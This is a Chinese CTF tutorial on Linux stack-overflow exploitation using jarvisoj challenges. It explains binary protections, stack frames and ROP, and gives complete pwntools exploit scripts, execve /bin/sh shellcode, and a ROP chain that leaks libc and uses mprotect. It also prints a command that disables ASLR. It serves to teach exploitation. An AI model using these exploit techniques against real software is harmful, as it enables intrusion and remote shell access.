> 原文链接: https://www.anquanke.com//post/id/196954 


# pwn的艺术浅谈（一）：linux栈溢出


                                阅读量   
                                **1149300**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01149ced15b8a2200a.png)](https://p2.ssl.qhimg.com/t01149ced15b8a2200a.png)



这个系列主要介绍linux pwn的基础知识，包括堆栈漏洞的一些利用方法。这篇文章是这个系列的第一篇文章。这里我们以jarvisoj上的一些pwn题为例来对linux下栈溢出利用和栈的基本知识做一个简单的介绍。题目地址：[https://www.jarvisoj.com/challenges。](https://www.jarvisoj.com/challenges%E3%80%82)

## 0. Level0，栈的基本结构及nx绕过

首先查看一下题目的保护措施（如下图所示），可以看到是一个只开启了NX的64位linux程序。

[![](https://p1.ssl.qhimg.com/t01d8a08f6a3f2cfcc0.png)](https://p1.ssl.qhimg.com/t01d8a08f6a3f2cfcc0.png)

关于linux pwn常见的保护

### <a class="reference-link" name="0.RELRO"></a>0.RELRO

部分RELRO(由ld -z relro启用):

将.got段映射为只读(但.got.plt还是可以写)

重新排列各个段来减少全局变量溢出导致覆盖代码段的可能性.

完全RELRO(由ld -z relro -z now启用)

执行部分RELRO的所有操作.

让链接器在链接期间(执行程序之前)解析所有的符号, 然后去除.got的写权限.

将.got.plt合并到.got段中, 所以.got.plt将不复存在.

### <a class="reference-link" name="1.stack%20canary"></a>1.stack canary

在函数返回值之前添加的一串随机数（不超过机器字长），末位为/x00（提供了覆盖最后一字节输出泄露canary的可能）

### <a class="reference-link" name="2.NX"></a>2.NX

no executable，标识页表是否可执行

### <a class="reference-link" name="3.pie"></a>3.pie

elf文件加载基址随机化，和系统的aslr不同。Linux系统的aslr可通过

```
sudo bash -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"
```

关闭，其中

0：没有随机化。即关闭 ASLR。

1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化。

2：完全的随机化。在 1 的基础上，通过 brk() 分配的内存空间也将被随机化。

下面我们分析下level0的功能并寻找漏洞，将程序拖进IDA中查看，

[![](https://p5.ssl.qhimg.com/t0194c674d8e56ea6e5.png)](https://p5.ssl.qhimg.com/t0194c674d8e56ea6e5.png)

可以看到程序保留了符号表（这里也可以使用IDA的反编译功能F5查看代码，不过为了避免IDA反编译的错误和一些数据类型导致的漏洞建议练习使用汇编查看关键代码），在入口点main函数中先调用write(1,”Hello, Worldn”,0xd)在控制台输出了Hello,Worldn的字符串（在Linux中，文件流fd为0、1、2分别代表标准输入、标准输出和标准错误输出，在程序中打开文件得到的fd从3开始增长）；然后将write的返回值(eax)清零，并调用了一个叫vulnerable_function的函数，根据名字可以猜测这个函数是存在漏洞的。

我们跟进vulnerable_function函数

[![](https://p3.ssl.qhimg.com/t01f0c127fb0ff779ff.png)](https://p3.ssl.qhimg.com/t01f0c127fb0ff779ff.png)

仔细观察不难发现vulnerable_function中调用了read(0,buf,0x200)，其中buf的位置是rbp-0x80，从标准输入（fd=0）读取的字符长度为0x200，这样就造成了栈溢出。

下面考虑怎么利用栈溢出来劫持控制流到达任意代码执行的效果。

一个比较典型的函数调用过程是：

0.开辟栈帧（函数栈空间）。栈的生长方式是从高地址向低地址生长，开辟栈帧一般的汇编指令（没有经过inline hook优化的）是push bp(当前栈基址压栈)、mov bp,sp(bp寄存器保存栈顶sp寄存器值)、sub sp,xx(开辟xx大小的栈空间)

[![](https://p5.ssl.qhimg.com/t011af735c6caf81549.png)](https://p5.ssl.qhimg.com/t011af735c6caf81549.png)

1.设置函数参数（寄存器保存或者参数压栈，栈中保存的参数逆序压栈）

[![](https://p2.ssl.qhimg.com/t0172c087960f57bc98.png)](https://p2.ssl.qhimg.com/t0172c087960f57bc98.png)

2.call新的func（call的原子操作是push下一条汇编指令pc，然后jump到func的地址继续执行），func执行的过程重复1-3

[![](https://p0.ssl.qhimg.com/t013b16e93af18bcf85.png)](https://p0.ssl.qhimg.com/t013b16e93af18bcf85.png)

这样call func后栈空间的布局大致是

[![](https://p4.ssl.qhimg.com/t0194b7bf78baf8d9e7.png)](https://p4.ssl.qhimg.com/t0194b7bf78baf8d9e7.png)

比较典型的函数执行完返回的过程是:
1. leave，等价于mov sp,bp；pop bp。mov sp,bp将开辟栈帧时保存的上一个栈顶sp寄存器的值（开辟栈帧时mov bp,sp使用bp寄存器保存）恢复到sp，此时栈顶sp指向图中bp的位置；pop bp恢复bp寄存器后sp指向pc的位置
1. retn，等价于pop ip，此时sp指向pc，pop ip将pc处的值赋值给ip寄存器，即返回到caller’s pc处继续执行
从以上过程不难看出只要我们控制了caller’s pc的值就可以在函数返回的时候返回到我们控制的pc处继续执行，从而劫持控制流执行我们的代码。

所以构造level0的payload为padding+bp+pc，其中padding覆盖栈空间为0x80字节大小。由于程序开启了nx保护（no execute，代码页不可执行），所以我们不能在函数返回的位置（pc）直接添加shellcode执行任意代码。nx保护一般的绕过方式是代码重用，即利用可执行代码页的代码来达到我们想要的任意代码执行的目的。仔细观察这个题目中有一个函数叫callsystem，跟进发现是一个执行system(‘/bin/sh’)的预置后门，所以我们把pc赋值成callsystem的地址400596即可。

[![](https://p4.ssl.qhimg.com/t015dea357043f8528e.png)](https://p4.ssl.qhimg.com/t015dea357043f8528e.png)

脚本如下

```
from pwn import *

context.log_level='DEBUG'

rmt=1
if rmt:
 r=remote('pwn2.jarvisoj.com',9881)
else:
 r=process('./level0')

sys_addr=0x400596
payload='a'*0x80+'b'*8+p64(sys_addr)
r.sendlineafter('Hello, World',payload)

r.interactive()
```



## 1. level1，未开启nx保护写shellcode执行任意代码

漏洞类型、成因与level0一致，只不过level1是一个32位未开启nx的程序（栈代码页可执行），程序中没有出现像level0一样的后门(system(‘/bin/sh’))，我们这里考虑写shellcode执行任意代码。

[![](https://p5.ssl.qhimg.com/t011561500acc99e09e.png)](https://p5.ssl.qhimg.com/t011561500acc99e09e.png)

程序输出了buf的地址，我们在buf的位置布置shellcode然后覆盖返回地址为

buf地址执行shellcode即可。构造payload=shellcode+padding+bp+ret，其中shellcode+padding覆盖栈空间，大小0x88；32位bp的长度为4字节；ret的地址覆盖为程序输出的buf的地址即可。

关于shellcode的编写，我们可以使用pwntools提供的shellcraft模块，也可以自己编写system(‘/bin/sh’)的调用。一个比较好用的linux系统中断号查询网址（自备飞机）[https://syscalls.kernelgrok.com/。](https://syscalls.kernelgrok.com/%E3%80%82)

查询可得0xb调用号为sys_execve，eax=0xb，ebx=path，ecx=argv，envp=0即可执行sys_execve(path,argv,envp)的调用。

[![](https://p5.ssl.qhimg.com/t0119df5bcbfd656b2d.png)](https://p5.ssl.qhimg.com/t0119df5bcbfd656b2d.png)

​ 脚本如下

```
from pwn import *

context.log_level='DEBUG'

rmt=1
if rmt:
​    r=remote('pwn2.jarvisoj.com',9877)
else:
​    r=process('./level1')

r.recvuntil('this:')
buf_addr=int(r.recvuntil('?',drop=True),16)
payload = asm(shellcraft.sh()).ljust(0x88,’x90’)
payload+=’b'*4 + p32(buf_addr)

r.send(payload)
r.interactive()
```

pwntools提供的shellcode

```
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
  /* push '/bin///shx00' */
  push 0x68
  push 0x732f2f2f
  push 0x6e69622f
  mov ebx, esp
  /* push argument array ['shx00'] */
  /* push 'shx00x00' */
  push 0x1010101
  xor dword ptr [esp], 0x1016972
  xor ecx, ecx
  push ecx /* null terminate */
  push 4
  pop ecx
  add ecx, esp
  push ecx /* 'shx00' */
  mov ecx, esp
  xor edx, edx
  /* call execve() */
  push SYS_execve /* 0xb */
  pop eax
  int 0x80
```



## 2. level5，利用rop绕过aslr、nx、读取shellcode修改内存属性执行任意代码

level2，level3，level4都是rop相关的pwn。level5在level3的基础上加了限制，这里以level5为例做一个rop的示范。rop即Return-oriented Programming（面向返回的编程），主要思路是修改函数栈的返回地址利用代码块gadget来达到任意代码执行的效果。（看到这里，相信你已经对栈的结构和劫持控制流的过程有了初步了解，尝试去理解一下下面这个利用rop多次触发漏洞绕过很多限制最终执行任意代码的过程吧;p）

[![](https://p0.ssl.qhimg.com/t0199e3bf657843dc60.png)](https://p0.ssl.qhimg.com/t0199e3bf657843dc60.png)

​ Level5给出的限制的意思是使用mmap分配一块内存，然后使用mprotect改变内存属性为可执行最终达到任意代码执行的目的。由此可以想到的思路是：
1. 泄露libc基址绕过aslr，得到mmap、mprotect的地址
1. 程序未开启pie，加载基址固定，容易想到的一个比较方便的存放shellcode的地址是bss段。这里我们把shellcode写到bss段基址处
1. 由于开启了nx保护，bss段内存不可执行，所以需要mprotect改变bss段内存属性为可执行
[![](https://p2.ssl.qhimg.com/t010eb898d4f4320c33.png)](https://p2.ssl.qhimg.com/t010eb898d4f4320c33.png)
1. 覆盖函数返回地址为bss段基址执行shellcode
### <a class="reference-link" name="1)%20%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80%E7%BB%95%E8%BF%87aslr"></a>1) 泄露libc基址绕过aslr

首先需要明确的一点是不管程序开没开启pie都是需要绕过aslr的，因为程序运行加载的动态库即libc是开启pie的，我们需要得到libc中函数的地址，反推我们需要得到libc的基址。

最终目的：执行write(1,write[@got](https://github.com/got))，返回到程序起始点以便多次触发漏洞

[![](https://p2.ssl.qhimg.com/t018ecc2f616c1512aa.jpg)](https://p2.ssl.qhimg.com/t018ecc2f616c1512aa.jpg)

Linux下函数传参方式如上所示，我们只需使第一个参数rdi=1,第二个参数rsi=write[@got](https://github.com/got)，返回到write[@plt](https://github.com/plt)执行即可。

got和plt表是linux实现动态连接的方式。plt即procedure linkage table, 进程链接表，这个表里包含了一些代码用来调用链接器解析外部函数地址，填充到got表中并跳转到该函数；如果got表对应函数地址已经填充则在got表中查找并跳转到对应函数。got即global offset table全局偏移表，如果已经填充符号函数对应地址，对应got项为相应函数地址；如果没有填充符号函数地址，内容为跳转到对应plt表项的代码并在plt表中完成对应函数地址的查找。

使用ROPgadget搜索可得赋值rdi的gadget地址为0x4006b3

[![](https://p3.ssl.qhimg.com/t012ac1db68abb5bdf9.png)](https://p3.ssl.qhimg.com/t012ac1db68abb5bdf9.png)

由于函数地址在内存中相对于libc加载地址的偏移和函数在libc中的偏移是相同的，我们用读到的write[@got](https://github.com/got)的值减去write在libc中的偏移即为libc在内存中加载的基址。

### <a class="reference-link" name="2%EF%BC%89%E6%8A%8Ashellcode%E5%86%99%E5%88%B0bss%E6%AE%B5%E5%9F%BA%E5%9D%80%E5%A4%84"></a>2）把shellcode写到bss段基址处

最终目的：执行read(0,bss_addr,sizeof(shellcode))，返回到程序起始点以便多次触发漏洞。执行的这段rop代码是从控制台读取shellcode到bss段，执行完rop我们还需要输入要执行的shellcode

### <a class="reference-link" name="3%EF%BC%89%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E5%86%85%E5%AD%98%E5%B1%9E%E6%80%A7"></a>3）修改bss段内存属性

最终目的：执行mprotect(bss_addr,0x1000,7)，并返回到程序起始点

其中mprotext的prot为7标识可读可写可执行，prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

1.PROT_READ：表示内存段内的内容可写；

2.PROT_WRITE：表示内存段内的内容可读；

3.PROT_EXEC：表示内存段中的内容可执行；

4.PROT_NONE：表示内存段中的内容根本没法访问。

### <a class="reference-link" name="4%EF%BC%89%E8%A6%86%E7%9B%96%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%BAbss%E6%AE%B5%E5%9F%BA%E5%9D%80%EF%BC%8C%E5%8D%B3shellcode%E7%9A%84%E8%B5%B7%E5%A7%8B%E5%9C%B0%E5%9D%80"></a>4）覆盖函数返回地址为bss段基址，即shellcode的起始地址

最终脚本如下：

```
from pwn import *

context.log_level='DEBUG'

local=1
if local:
​    r=process('./level3_x64')
else:
​    r=remote('pwn2.jarvisoj.com',9883)
file=ELF('./level3_x64')
libc=ELF('./libc-2.19.so')

def debug():
​    if local:
​       print 'pid: '+str(r.pid)
​       pause()

prdi=0x4006b3
prsi=0x4006b1
bss_start=0x600A88
start_addr=0x4004F0
'''
  0x00000000004006b1 : pop rsi ; pop r15 ; ret
  0x0000000000001b8e : pop rdx ; ret
'''

payload1='a'*0x80+'b'*8+p64(prdi)+p64(1)+p64(prsi)+p64(file.got['write'])+'c'*8+p64(file.plt['write'])
payload1+=p64(start_addr)
r.recvuntil('n')
r.send(payload1)
write_got=u64(r.recv(8))
sleep(1)

libc_base=write_got-libc.sym['write']
mprotect=libc_base+libc.sym['mprotect']
prdx=libc_base+0x1b8e
print hex(libc_base)
print hex(mprotect)
print hex(prdx)

payload2='a'*0x80+'b'*8+p64(prdi)+p64(0x600000)+p64(prsi)+p64(0x1000)+'c'*8+p64(prdx)+p64(7)+p64(mprotect)+p64(start_addr)
r.recvuntil('n')
r.send(payload2)
sleep(1)
debug()

payload3='a'*0x80+'b'*8+p64(prdi)+p64(0)+p64(prsi)+p64(bss_start)+'c'*8+p64(prdx)+p64(48)+p64(file.plt['read'])+p64(start_addr)
r.recvuntil('n')
r.send(payload3)
sleep(1)
r.send(asm(shellcraft.amd64.linux.sh(),arch='amd64'))
debug()

payload4='a'*0x80+'b'*8+p64(bss_start)
r.recvuntil('n')
r.send(payload4)

r.interactive()
```



## 总结

这篇文章主要介绍了栈的基础知识和一些栈溢出pwn的方法、原理，希望大家读完能有所收获。
